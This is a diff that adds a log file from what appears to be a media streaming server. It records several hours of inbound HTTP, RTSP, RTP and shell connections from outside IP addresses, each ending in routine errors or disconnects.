@@ -1,0 +1,775 @@
+2024-08-23 00:14:14.560 T MediaServer[22196-event poller 1] HttpSession.cpp:25 HttpSession | 140494017413856(93.174.93.12:60000) 
+2024-08-23 00:14:44.757 T MediaServer[22196-event poller 1] HttpSession.cpp:122 onError | 140494017413856(93.174.93.12:60000) connection reset by peer
+2024-08-23 00:14:44.758 T MediaServer[22196-event poller 1] HttpSession.cpp:31 ~HttpSession | 140494017413856(93.174.93.12:60000) 
+2024-08-23 00:17:46.104 D MediaServer[22196-event poller 1] RtpSession.cpp:35 RtpSession | 140494017416432(220.196.160.51:25932) 
+2024-08-23 00:17:56.604 W MediaServer[22196-event poller 1] RtpSession.cpp:62 onError |  illegal connection
+2024-08-23 00:17:56.605 D MediaServer[22196-event poller 1] RtpSession.cpp:41 ~RtpSession | 140494017416432(220.196.160.51:25932) 
+2024-08-23 00:18:41.655 D MediaServer[22196-event poller 1] RtpSession.cpp:35 RtpSession | 140494017403920(220.196.160.45:48482) 
+2024-08-23 00:18:52.633 W MediaServer[22196-event poller 1] RtpSession.cpp:62 onError |  illegal connection
+2024-08-23 00:18:52.633 D MediaServer[22196-event poller 1] RtpSession.cpp:41 ~RtpSession | 140494017403920(220.196.160.45:48482) 
+2024-08-23 00:26:10.799 D MediaServer[22196-event poller 1] ShellSession.cpp:26 ShellSession | 140494017404480(173.52.101.9:37064) 
+2024-08-23 00:26:13.661 W MediaServer[22196-event poller 1] ShellSession.cpp:61 onError | 140494017404480(173.52.101.9:37064) end of file
+2024-08-23 00:26:13.661 D MediaServer[22196-event poller 1] ShellSession.cpp:31 ~ShellSession | 140494017404480(173.52.101.9:37064) 
+2024-08-23 00:42:10.783 T MediaServer[22196-event poller 1] HttpSession.cpp:25 HttpSession | 140494017413856(193.142.146.136:38928) 
+2024-08-23 00:42:30.788 T MediaServer[22196-event poller 1] HttpSession.cpp:122 onError | 140494017413856(193.142.146.136:38928) end of file
+2024-08-23 00:42:30.788 T MediaServer[22196-event poller 1] HttpSession.cpp:31 ~HttpSession | 140494017413856(193.142.146.136:38928) 
+2024-08-23 00:54:03.623 T MediaServer[22196-event poller 1] HttpSession.cpp:25 HttpSession | 140494017413856(167.172.172.183:39640) 
+2024-08-23 00:54:03.898 T MediaServer[22196-event poller 1] HttpSession.cpp:122 onError | 140494017413856(167.172.172.183:39640) end of file
+2024-08-23 00:54:03.898 T MediaServer[22196-event poller 1] HttpSession.cpp:31 ~HttpSession | 140494017413856(167.172.172.183:39640) 
+2024-08-23 00:54:05.263 T MediaServer[22196-event poller 1] HttpSession.cpp:25 HttpSession | 140494017465600(167.172.172.183:49382) 
+2024-08-23 00:54:05.969 T MediaServer[22196-event poller 1] HttpSession.cpp:122 onError | 140494017465600(167.172.172.183:49382) end of file
+2024-08-23 00:54:05.969 T MediaServer[22196-event poller 1] HttpSession.cpp:31 ~HttpSession | 140494017465600(167.172.172.183:49382) 
+2024-08-23 01:01:03.942 T MediaServer[22196-event poller 1] HttpSession.cpp:25 HttpSession | 140494017465024(57.151.67.251:42388) 
+2024-08-23 01:01:04.190 T MediaServer[22196-event poller 1] HttpSession.cpp:122 onError | 140494017465024(57.151.67.251:42388) end of file
+2024-08-23 01:01:04.190 T MediaServer[22196-event poller 1] HttpSession.cpp:31 ~HttpSession | 140494017465024(57.151.67.251:42388) 
+2024-08-23 01:09:18.356 T MediaServer[22196-event poller 1] HttpSession.cpp:25 HttpSession | 140494017465024(185.242.226.115:55287) 
+2024-08-23 01:09:28.189 T MediaServer[22196-event poller 1] HttpSession.cpp:122 onError | 140494017465024(185.242.226.115:55287) end of file
+2024-08-23 01:09:28.189 T MediaServer[22196-event poller 1] HttpSession.cpp:31 ~HttpSession | 140494017465024(185.242.226.115:55287) 
+2024-08-23 01:21:55.967 D MediaServer[22196-event poller 1] ShellSession.cpp:26 ShellSession | 140494017469184(104.45.233.173:55074) 
+2024-08-23 01:21:56.171 W MediaServer[22196-event poller 1] ShellSession.cpp:61 onError | 140494017469184(104.45.233.173:55074) end of file
+2024-08-23 01:21:56.171 D MediaServer[22196-event poller 1] ShellSession.cpp:31 ~ShellSession | 140494017469184(104.45.233.173:55074) 
+2024-08-23 02:06:14.619 T MediaServer[22196-event poller 1] HttpSession.cpp:25 HttpSession | 140494017413856(80.82.77.202:60000) 
+2024-08-23 02:06:47.103 T MediaServer[22196-event poller 1] HttpSession.cpp:122 onError | 140494017413856(80.82.77.202:60000) connection reset by peer
+2024-08-23 02:06:47.103 T MediaServer[22196-event poller 1] HttpSession.cpp:31 ~HttpSession | 140494017413856(80.82.77.202:60000) 
+2024-08-23 02:12:41.150 T MediaServer[22196-event poller 1] HttpSession.cpp:25 HttpSession | 140494017469184(193.142.146.136:54942) 
+2024-08-23 02:13:01.150 T MediaServer[22196-event poller 1] HttpSession.cpp:122 onError | 140494017469184(193.142.146.136:54942) end of file
+2024-08-23 02:13:01.150 T MediaServer[22196-event poller 1] HttpSession.cpp:31 ~HttpSession | 140494017469184(193.142.146.136:54942) 
+2024-08-23 02:20:50.659 T MediaServer[22196-event poller 1] HttpSession.cpp:25 HttpSession | 140494017469184(178.215.236.250:12918) 
+2024-08-23 02:20:50.924 T MediaServer[22196-event poller 1] HttpSession.cpp:122 onError | 140494017469184(178.215.236.250:12918) end of file
+2024-08-23 02:20:50.924 T MediaServer[22196-event poller 1] HttpSession.cpp:31 ~HttpSession | 140494017469184(178.215.236.250:12918) 
+2024-08-23 02:20:51.421 T MediaServer[22196-event poller 1] HttpSession.cpp:25 HttpSession | 140494017469184(178.215.236.250:12961) 
+2024-08-23 02:20:51.816 T MediaServer[22196-event poller 1] HttpSession.cpp:122 onError | 140494017469184(178.215.236.250:12961) end of file
+2024-08-23 02:20:51.816 T MediaServer[22196-event poller 1] HttpSession.cpp:31 ~HttpSession | 140494017469184(178.215.236.250:12961) 
+2024-08-23 02:20:52.062 T MediaServer[22196-event poller 1] HttpSession.cpp:25 HttpSession | 140494017465024(178.215.236.250:12996) 
+2024-08-23 02:20:53.021 T MediaServer[22196-event poller 1] HttpSession.cpp:122 onError | 140494017465024(178.215.236.250:12996) end of file
+2024-08-23 02:20:53.021 T MediaServer[22196-event poller 1] HttpSession.cpp:31 ~HttpSession | 140494017465024(178.215.236.250:12996) 
+2024-08-23 02:20:53.239 T MediaServer[22196-event poller 1] HttpSession.cpp:25 HttpSession | 140494017457152(178.215.236.250:13069) 
+2024-08-23 02:20:54.389 T MediaServer[22196-event poller 1] HttpSession.cpp:122 onError | 140494017457152(178.215.236.250:13069) end of file
+2024-08-23 02:20:54.389 T MediaServer[22196-event poller 1] HttpSession.cpp:31 ~HttpSession | 140494017457152(178.215.236.250:13069) 
+2024-08-23 02:20:54.659 T MediaServer[22196-event poller 1] HttpSession.cpp:25 HttpSession | 140494017469184(178.215.236.250:13137) 
+2024-08-23 02:20:55.029 T MediaServer[22196-event poller 1] HttpSession.cpp:122 onError | 140494017469184(178.215.236.250:13137) end of file
+2024-08-23 02:20:55.029 T MediaServer[22196-event poller 1] HttpSession.cpp:31 ~HttpSession | 140494017469184(178.215.236.250:13137) 
+2024-08-23 02:23:09.332 T MediaServer[22196-event poller 1] HttpSession.cpp:25 HttpSession | 140494017469184(167.94.146.63:51278) 
+2024-08-23 02:23:12.398 T MediaServer[22196-event poller 1] HttpSession.cpp:122 onError | 140494017469184(167.94.146.63:51278) connection reset by peer
+2024-08-23 02:23:12.398 T MediaServer[22196-event poller 1] HttpSession.cpp:31 ~HttpSession | 140494017469184(167.94.146.63:51278) 
+2024-08-23 02:23:12.674 T MediaServer[22196-event poller 1] HttpSession.cpp:25 HttpSession | 140494017403920(167.94.146.63:39950) 
+2024-08-23 02:23:17.782 T MediaServer[22196-event poller 1] HttpSession.cpp:122 onError | 140494017403920(167.94.146.63:39950) connection reset by peer
+2024-08-23 02:23:17.782 T MediaServer[22196-event poller 1] HttpSession.cpp:31 ~HttpSession | 140494017403920(167.94.146.63:39950) 
+2024-08-23 02:23:21.542 T MediaServer[22196-event poller 1] HttpSession.cpp:25 HttpSession | 140494017403920(167.94.146.63:53294) 
+2024-08-23 02:23:22.414 T MediaServer[22196-event poller 1] HttpSession.cpp:122 onError | 140494017403920(167.94.146.63:53294) end of file
+2024-08-23 02:23:22.414 T MediaServer[22196-event poller 1] HttpSession.cpp:31 ~HttpSession | 140494017403920(167.94.146.63:53294) 
+2024-08-23 02:23:22.690 T MediaServer[22196-event poller 1] HttpSession.cpp:25 HttpSession | 140494017403920(167.94.146.63:53358) 
+2024-08-23 02:23:23.291 T MediaServer[22196-event poller 1] HttpSession.cpp:122 onError | 140494017403920(167.94.146.63:53358) close connection after send http body completed.
+2024-08-23 02:23:23.291 T MediaServer[22196-event poller 1] HttpSession.cpp:31 ~HttpSession | 140494017403920(167.94.146.63:53358) 
+2024-08-23 02:23:23.967 T MediaServer[22196-event poller 1] HttpSession.cpp:25 HttpSession | 140494017403920(167.94.146.63:53382) 
+2024-08-23 02:23:24.782 W MediaServer[22196-event poller 1] HttpSession.cpp:66 onRecvHeader | 140494017403920(167.94.146.63:53382) 不支持该命令:PRI
+2024-08-23 02:23:24.782 T MediaServer[22196-event poller 1] HttpSession.cpp:122 onError | 140494017403920(167.94.146.63:53382) close connection after send http header completed with status code:405
+2024-08-23 02:23:24.782 W MediaServer[22196-event poller 1] HttpSession.cpp:66 onRecvHeader | 140494017403920(167.94.146.63:53382) 不支持该命令:
+2024-08-23 02:23:24.782 T MediaServer[22196-event poller 1] HttpSession.cpp:31 ~HttpSession | 140494017403920(167.94.146.63:53382) 
+2024-08-23 02:23:26.719 T MediaServer[22196-event poller 1] HttpSession.cpp:25 HttpSession | 140494017403920(167.94.146.63:53446) 
+2024-08-23 02:23:27.778 T MediaServer[22196-event poller 1] HttpSession.cpp:122 onError | 140494017403920(167.94.146.63:53446) connection reset by peer
+2024-08-23 02:23:27.778 T MediaServer[22196-event poller 1] HttpSession.cpp:31 ~HttpSession | 140494017403920(167.94.146.63:53446) 
+2024-08-23 02:23:29.660 T MediaServer[22196-event poller 1] HttpSession.cpp:25 HttpSession | 140494017403920(167.94.146.63:53488) 
+2024-08-23 02:23:30.533 T MediaServer[22196-event poller 1] HttpSession.cpp:122 onError | 140494017403920(167.94.146.63:53488) connection reset by peer
+2024-08-23 02:23:30.534 T MediaServer[22196-event poller 1] HttpSession.cpp:31 ~HttpSession | 140494017403920(167.94.146.63:53488) 
+2024-08-23 02:23:31.610 T MediaServer[22196-event poller 1] HttpSession.cpp:25 HttpSession | 140494017403920(167.94.146.63:42822) 
+2024-08-23 02:23:32.353 T MediaServer[22196-event poller 1] HttpSession.cpp:122 onError | 140494017403920(167.94.146.63:42822) connection reset by peer
+2024-08-23 02:23:32.353 T MediaServer[22196-event poller 1] HttpSession.cpp:31 ~HttpSession | 140494017403920(167.94.146.63:42822) 
+2024-08-23 02:52:13.354 T MediaServer[22196-event poller 1] HttpSession.cpp:25 HttpSession | 140494017413856(195.170.172.128:38572) 
+2024-08-23 02:52:13.670 T MediaServer[22196-event poller 1] HttpSession.cpp:122 onError | 140494017413856(195.170.172.128:38572) end of file
+2024-08-23 02:52:13.670 T MediaServer[22196-event poller 1] HttpSession.cpp:31 ~HttpSession | 140494017413856(195.170.172.128:38572) 
+2024-08-23 02:52:14.914 T MediaServer[22196-event poller 1] HttpSession.cpp:25 HttpSession | 140494017413856(195.170.172.128:43324) 
+2024-08-23 02:52:26.177 T MediaServer[22196-event poller 1] HttpSession.cpp:122 onError | 140494017413856(195.170.172.128:43324) end of file
+2024-08-23 02:52:26.177 T MediaServer[22196-event poller 1] HttpSession.cpp:31 ~HttpSession | 140494017413856(195.170.172.128:43324) 
+2024-08-23 02:52:26.399 T MediaServer[22196-event poller 1] HttpSession.cpp:25 HttpSession | 140494017413856(195.170.172.128:52278) 
+2024-08-23 02:52:37.652 T MediaServer[22196-event poller 1] HttpSession.cpp:122 onError | 140494017413856(195.170.172.128:52278) end of file
+2024-08-23 02:52:37.652 T MediaServer[22196-event poller 1] HttpSession.cpp:31 ~HttpSession | 140494017413856(195.170.172.128:52278) 
+2024-08-23 02:52:37.871 T MediaServer[22196-event poller 1] HttpSession.cpp:25 HttpSession | 140494017413856(195.170.172.128:60084) 
+2024-08-23 02:52:49.635 T MediaServer[22196-event poller 1] HttpSession.cpp:122 onError | 140494017413856(195.170.172.128:60084) end of file
+2024-08-23 02:52:49.636 T MediaServer[22196-event poller 1] HttpSession.cpp:31 ~HttpSession | 140494017413856(195.170.172.128:60084) 
+2024-08-23 02:52:49.863 T MediaServer[22196-event poller 1] HttpSession.cpp:25 HttpSession | 140494017413856(195.170.172.128:42880) 
+2024-08-23 02:53:00.859 T MediaServer[22196-event poller 1] HttpSession.cpp:122 onError | 140494017413856(195.170.172.128:42880) end of file
+2024-08-23 02:53:00.859 T MediaServer[22196-event poller 1] HttpSession.cpp:31 ~HttpSession | 140494017413856(195.170.172.128:42880) 
+2024-08-23 02:53:02.107 T MediaServer[22196-event poller 1] HttpSession.cpp:25 HttpSession | 140494017413856(195.170.172.128:49914) 
+2024-08-23 02:53:13.609 T MediaServer[22196-event poller 1] HttpSession.cpp:122 onError | 140494017413856(195.170.172.128:49914) end of file
+2024-08-23 02:53:13.609 T MediaServer[22196-event poller 1] HttpSession.cpp:31 ~HttpSession | 140494017413856(195.170.172.128:49914) 
+2024-08-23 02:53:14.840 T MediaServer[22196-event poller 1] HttpSession.cpp:25 HttpSession | 140494017413856(195.170.172.128:60746) 
+2024-08-23 02:53:15.036 T MediaServer[22196-event poller 1] HttpSession.cpp:122 onError | 140494017413856(195.170.172.128:60746) close connection after send http body completed.
+2024-08-23 02:53:15.036 T MediaServer[22196-event poller 1] HttpSession.cpp:31 ~HttpSession | 140494017413856(195.170.172.128:60746) 
+2024-08-23 02:53:15.977 T MediaServer[22196-event poller 1] HttpSession.cpp:25 HttpSession | 140494017413856(195.170.172.128:39676) 
+2024-08-23 02:53:15.978 T MediaServer[22196-event poller 1] HttpSession.cpp:122 onError | 140494017413856(195.170.172.128:39676) close connection after send http header completed with status code:404
+2024-08-23 02:53:15.978 T MediaServer[22196-event poller 1] HttpSession.cpp:31 ~HttpSession | 140494017413856(195.170.172.128:39676) 
+2024-08-23 02:53:16.856 T MediaServer[22196-event poller 1] HttpSession.cpp:25 HttpSession | 140494017465696(195.170.172.128:42896) 
+2024-08-23 02:53:17.011 T MediaServer[22196-event poller 1] HttpSession.cpp:122 onError | 140494017465696(195.170.172.128:42896) close connection after send http header completed with status code:404
+2024-08-23 02:53:17.011 T MediaServer[22196-event poller 1] HttpSession.cpp:31 ~HttpSession | 140494017465696(195.170.172.128:42896) 
+2024-08-23 02:53:17.858 T MediaServer[22196-event poller 1] HttpSession.cpp:25 HttpSession | 140494017465184(195.170.172.128:46114) 
+2024-08-23 02:53:18.297 T MediaServer[22196-event poller 1] HttpSession.cpp:122 onError | 140494017465184(195.170.172.128:46114) close connection after send http body completed.
+2024-08-23 02:53:18.297 T MediaServer[22196-event poller 1] HttpSession.cpp:31 ~HttpSession | 140494017465184(195.170.172.128:46114) 
+2024-08-23 02:53:19.259 T MediaServer[22196-event poller 1] HttpSession.cpp:25 HttpSession | 140494017469184(195.170.172.128:50496) 
+2024-08-23 02:53:20.309 T MediaServer[22196-event poller 1] HttpSession.cpp:122 onError | 140494017469184(195.170.172.128:50496) close connection after send http body completed.
+2024-08-23 02:53:20.309 T MediaServer[22196-event poller 1] HttpSession.cpp:31 ~HttpSession | 140494017469184(195.170.172.128:50496) 
+2024-08-23 02:53:21.333 T MediaServer[22196-event poller 1] HttpSession.cpp:25 HttpSession | 140494017469184(195.170.172.128:57260) 
+2024-08-23 02:53:22.552 T MediaServer[22196-event poller 1] HttpSession.cpp:122 onError | 140494017469184(195.170.172.128:57260) close connection after send http body completed.
+2024-08-23 02:53:22.552 T MediaServer[22196-event poller 1] HttpSession.cpp:31 ~HttpSession | 140494017469184(195.170.172.128:57260) 
+2024-08-23 02:53:23.186 T MediaServer[22196-event poller 1] HttpSession.cpp:25 HttpSession | 140494017413856(195.170.172.128:34848) 
+2024-08-23 02:53:23.790 T MediaServer[22196-event poller 1] HttpSession.cpp:122 onError | 140494017413856(195.170.172.128:34848) close connection after send http body completed.
+2024-08-23 02:53:23.790 T MediaServer[22196-event poller 1] HttpSession.cpp:31 ~HttpSession | 140494017413856(195.170.172.128:34848) 
+2024-08-23 02:53:24.835 T MediaServer[22196-event poller 1] HttpSession.cpp:25 HttpSession | 140494017413856(195.170.172.128:38866) 
+2024-08-23 02:53:25.386 T MediaServer[22196-event poller 1] HttpSession.cpp:122 onError | 140494017413856(195.170.172.128:38866) close connection after send http body completed.
+2024-08-23 02:53:25.386 T MediaServer[22196-event poller 1] HttpSession.cpp:31 ~HttpSession | 140494017413856(195.170.172.128:38866) 
+2024-08-23 02:53:26.525 T MediaServer[22196-event poller 1] HttpSession.cpp:25 HttpSession | 140494017413856(195.170.172.128:43168) 
+2024-08-23 02:53:27.022 T MediaServer[22196-event poller 1] HttpSession.cpp:122 onError | 140494017413856(195.170.172.128:43168) close connection after send http body completed.
+2024-08-23 02:53:27.022 T MediaServer[22196-event poller 1] HttpSession.cpp:31 ~HttpSession | 140494017413856(195.170.172.128:43168) 
+2024-08-23 02:53:28.011 T MediaServer[22196-event poller 1] HttpSession.cpp:25 HttpSession | 140494017413856(195.170.172.128:46896) 
+2024-08-23 02:53:39.360 T MediaServer[22196-event poller 1] HttpSession.cpp:122 onError | 140494017413856(195.170.172.128:46896) end of file
+2024-08-23 02:53:39.360 T MediaServer[22196-event poller 1] HttpSession.cpp:31 ~HttpSession | 140494017413856(195.170.172.128:46896) 
+2024-08-23 02:56:08.369 T MediaServer[22196-event poller 1] HttpSession.cpp:25 HttpSession | 140494017465024(59.83.208.104:20304) 
+2024-08-23 02:56:08.379 T MediaServer[22196-event poller 1] HttpSession.cpp:122 onError | 140494017465024(59.83.208.104:20304) end of file
+2024-08-23 02:56:08.379 T MediaServer[22196-event poller 1] HttpSession.cpp:31 ~HttpSession | 140494017465024(59.83.208.104:20304) 
+2024-08-23 02:56:08.411 T MediaServer[22196-event poller 1] HttpSession.cpp:25 HttpSession | 140494017465024(180.101.244.14:60944) 
+2024-08-23 02:56:08.421 T MediaServer[22196-event poller 1] HttpSession.cpp:122 onError | 140494017465024(180.101.244.14:60944) end of file
+2024-08-23 02:56:08.421 T MediaServer[22196-event poller 1] HttpSession.cpp:31 ~HttpSession | 140494017465024(180.101.244.14:60944) 
+2024-08-23 02:56:08.627 T MediaServer[22196-event poller 1] HttpSession.cpp:25 HttpSession | 140494017465024(59.83.208.103:44676) 
+2024-08-23 02:56:09.958 T MediaServer[22196-event poller 1] HttpSession.cpp:122 onError | 140494017465024(59.83.208.103:44676) end of file
+2024-08-23 02:56:09.958 T MediaServer[22196-event poller 1] HttpSession.cpp:31 ~HttpSession | 140494017465024(59.83.208.103:44676) 
+2024-08-23 02:56:40.505 T MediaServer[22196-event poller 1] HttpSession.cpp:25 HttpSession | 140494017413856(180.101.244.16:37988) 
+2024-08-23 02:56:40.516 T MediaServer[22196-event poller 1] HttpSession.cpp:122 onError | 140494017413856(180.101.244.16:37988) end of file
+2024-08-23 02:56:40.516 T MediaServer[22196-event poller 1] HttpSession.cpp:31 ~HttpSession | 140494017413856(180.101.244.16:37988) 
+2024-08-23 02:57:09.335 T MediaServer[22196-event poller 1] HttpSession.cpp:25 HttpSession | 140494017413856(220.196.160.117:24926) 
+2024-08-23 02:57:09.339 T MediaServer[22196-event poller 1] HttpSession.cpp:122 onError | 140494017413856(220.196.160.117:24926) end of file
+2024-08-23 02:57:09.339 T MediaServer[22196-event poller 1] HttpSession.cpp:31 ~HttpSession | 140494017413856(220.196.160.117:24926) 
+2024-08-23 02:59:58.408 T MediaServer[22196-event poller 1] HttpSession.cpp:25 HttpSession | 140494017413856(180.101.245.253:58316) 
+2024-08-23 02:59:58.421 T MediaServer[22196-event poller 1] HttpSession.cpp:122 onError | 140494017413856(180.101.245.253:58316) end of file
+2024-08-23 02:59:58.421 T MediaServer[22196-event poller 1] HttpSession.cpp:31 ~HttpSession | 140494017413856(180.101.245.253:58316) 
+2024-08-23 03:04:10.948 T MediaServer[22196-event poller 1] HttpSession.cpp:25 HttpSession | 140494017413856(220.196.160.76:46164) 
+2024-08-23 03:04:10.955 T MediaServer[22196-event poller 1] HttpSession.cpp:122 onError | 140494017413856(220.196.160.76:46164) end of file
+2024-08-23 03:04:10.955 T MediaServer[22196-event poller 1] HttpSession.cpp:31 ~HttpSession | 140494017413856(220.196.160.76:46164) 
+2024-08-23 03:08:01.162 D MediaServer[22196-event poller 0] main.cpp:196 operator() | resource temporarily unavailable
+2024-08-23 03:08:01.162 W MediaServer[22196-event poller 0] main.cpp:202 operator() | Event_Error
+2024-08-23 03:11:03.625 D MediaServer[22196-event poller 1] ShellSession.cpp:26 ShellSession | 140494017417056(209.141.40.117:55338) 
+2024-08-23 03:11:03.780 W MediaServer[22196-event poller 1] ShellSession.cpp:61 onError | 140494017417056(209.141.40.117:55338) end of file
+2024-08-23 03:11:03.780 D MediaServer[22196-event poller 1] ShellSession.cpp:31 ~ShellSession | 140494017417056(209.141.40.117:55338) 
+2024-08-23 03:12:27.450 T MediaServer[22196-event poller 1] HttpSession.cpp:25 HttpSession | 140494017413856(157.245.101.12:50710) 
+2024-08-23 03:12:27.451 T MediaServer[22196-event poller 1] HttpSession.cpp:122 onError | 140494017413856(157.245.101.12:50710) close connection after send http body completed.
+2024-08-23 03:12:27.451 T MediaServer[22196-event poller 1] HttpSession.cpp:31 ~HttpSession | 140494017413856(157.245.101.12:50710) 
+2024-08-23 03:41:04.926 T MediaServer[22196-event poller 1] HttpSession.cpp:25 HttpSession | 140494017413856(185.224.128.84:42952) 
+2024-08-23 03:41:05.158 T MediaServer[22196-event poller 1] HttpSession.cpp:122 onError | 140494017413856(185.224.128.84:42952) end of file
+2024-08-23 03:41:05.158 T MediaServer[22196-event poller 1] HttpSession.cpp:31 ~HttpSession | 140494017413856(185.224.128.84:42952) 
+2024-08-23 03:41:31.800 D MediaServer[22196-event poller 1] RtspSession.cpp:53 RtspSession | 140494017465024(167.94.138.117:51832) 
+2024-08-23 03:41:31.831 T MediaServer[22196-event poller 1] RtspSession.cpp:395 onAuthSuccess | 140494017465024(167.94.138.117:51832) 
+2024-08-23 03:41:46.832 W MediaServer[22196-event poller 1] RtspSession.cpp:65 onError | 140494017465024(167.94.138.117:51832) RTSP播放器(__defaultVhost__//)断开:no such stream:__defaultVhost__  ,耗时(s):15
+2024-08-23 03:41:46.832 D MediaServer[22196-event poller 1] RtspSession.cpp:59 ~RtspSession | 140494017465024(167.94.138.117:51832) 
+2024-08-23 03:41:50.349 D MediaServer[22196-event poller 1] RtspSession.cpp:53 RtspSession | 140494017465024(167.94.138.117:53416) 
+2024-08-23 03:41:53.636 W MediaServer[22196-event poller 1] RtspSession.cpp:65 onError | 140494017465024(167.94.138.117:53416) RTSP播放器(//)断开:connection reset by peer,耗时(s):3
+2024-08-23 03:41:53.636 D MediaServer[22196-event poller 1] RtspSession.cpp:59 ~RtspSession | 140494017465024(167.94.138.117:53416) 
+2024-08-23 03:41:53.860 D MediaServer[22196-event poller 1] RtspSession.cpp:53 RtspSession | 140494017465024(167.94.138.117:53422) 
+2024-08-23 03:42:00.319 W MediaServer[22196-event poller 1] RtspSession.cpp:65 onError | 140494017465024(167.94.138.117:53422) RTSP播放器(//)断开:connection reset by peer,耗时(s):6
+2024-08-23 03:42:00.319 D MediaServer[22196-event poller 1] RtspSession.cpp:59 ~RtspSession | 140494017465024(167.94.138.117:53422) 
+2024-08-23 03:42:00.537 D MediaServer[22196-event poller 1] RtspSession.cpp:53 RtspSession | 140494017465024(167.94.138.117:34426) 
+2024-08-23 03:42:10.792 W MediaServer[22196-event poller 1] RtspSession.cpp:65 onError | 140494017465024(167.94.138.117:34426) RTSP播放器(//)断开:connection reset by peer,耗时(s):10
+2024-08-23 03:42:10.792 D MediaServer[22196-event poller 1] RtspSession.cpp:59 ~RtspSession | 140494017465024(167.94.138.117:34426) 
+2024-08-23 03:42:14.391 D MediaServer[22196-event poller 1] RtspSession.cpp:53 RtspSession | 140494017459856(167.94.138.117:40216) 
+2024-08-23 03:42:29.302 W MediaServer[22196-event poller 1] RtspSession.cpp:65 onError | 140494017459856(167.94.138.117:40216) RTSP播放器(//)断开:end of file,耗时(s):14
+2024-08-23 03:42:29.302 D MediaServer[22196-event poller 1] RtspSession.cpp:59 ~RtspSession | 140494017459856(167.94.138.117:40216) 
+2024-08-23 03:42:29.530 D MediaServer[22196-event poller 1] RtspSession.cpp:53 RtspSession | 140494017465024(167.94.138.117:46266) 
+2024-08-23 03:42:30.827 W MediaServer[22196-event poller 1] RtspSession.cpp:65 onError | 140494017465024(167.94.138.117:46266) RTSP播放器(//)断开:end of file,耗时(s):1
+2024-08-23 03:42:30.827 D MediaServer[22196-event poller 1] RtspSession.cpp:59 ~RtspSession | 140494017465024(167.94.138.117:46266) 
+2024-08-23 03:42:31.106 D MediaServer[22196-event poller 1] RtspSession.cpp:53 RtspSession | 140494017459856(167.94.138.117:46288) 
+2024-08-23 03:42:31.616 W MediaServer[22196-event poller 1] RtspSession.cpp:65 onError | 140494017459856(167.94.138.117:46288) RTSP播放器(__defaultVhost__//)断开:403 Forbidden:PRI,耗时(s):0
+2024-08-23 03:42:31.616 D MediaServer[22196-event poller 1] RtspSession.cpp:59 ~RtspSession | 140494017459856(167.94.138.117:46288) 
+2024-08-23 03:56:54.658 T MediaServer[22196-event poller 1] HttpSession.cpp:25 HttpSession | 140494017413856(185.224.128.59:44640) 
+2024-08-23 03:56:54.899 T MediaServer[22196-event poller 1] HttpSession.cpp:122 onError | 140494017413856(185.224.128.59:44640) end of file
+2024-08-23 03:56:54.899 T MediaServer[22196-event poller 1] HttpSession.cpp:31 ~HttpSession | 140494017413856(185.224.128.59:44640) 
+2024-08-23 04:16:15.413 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950295360(141.255.160.234:38252) 
+2024-08-23 04:16:35.414 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950295360(141.255.160.234:38252) end of file
+2024-08-23 04:16:35.414 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950295360(141.255.160.234:38252) 
+2024-08-23 04:18:58.357 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950295312(185.224.128.84:39898) 
+2024-08-23 04:18:58.538 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950295312(185.224.128.84:39898) end of file
+2024-08-23 04:18:58.538 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950295312(185.224.128.84:39898) 
+2024-08-23 04:26:19.360 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950293440(79.124.56.186:3027) 
+2024-08-23 04:26:50.766 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950293440(79.124.56.186:3027) session timeout
+2024-08-23 04:26:50.766 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950293440(79.124.56.186:3027) 
+2024-08-23 04:28:17.129 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950293440(193.142.146.136:54156) 
+2024-08-23 04:28:37.166 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950293440(193.142.146.136:54156) end of file
+2024-08-23 04:28:37.166 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950293440(193.142.146.136:54156) 
+2024-08-23 04:31:14.319 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950293376(194.165.16.26:35008) 
+2024-08-23 04:31:24.319 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950293376(194.165.16.26:35008) end of file
+2024-08-23 04:31:24.319 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950293376(194.165.16.26:35008) 
+2024-08-23 04:45:22.846 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950293376(95.214.55.138:46892) 
+2024-08-23 04:45:32.859 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950293376(95.214.55.138:46892) end of file
+2024-08-23 04:45:32.859 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950293376(95.214.55.138:46892) 
+2024-08-23 04:53:10.916 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950293152(172.105.234.247:62324) 
+2024-08-23 04:53:11.136 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950293152(172.105.234.247:62324) close connection after send http body completed.
+2024-08-23 04:53:11.136 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950293152(172.105.234.247:62324) 
+2024-08-23 05:09:38.001 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950293152(149.50.103.48:53824) 
+2024-08-23 05:09:48.045 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950293152(149.50.103.48:53824) end of file
+2024-08-23 05:09:48.045 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950293152(149.50.103.48:53824) 
+2024-08-23 05:27:34.120 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950290304(180.163.28.143:53592) 
+2024-08-23 05:28:05.969 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950290304(180.163.28.143:53592) session timeout
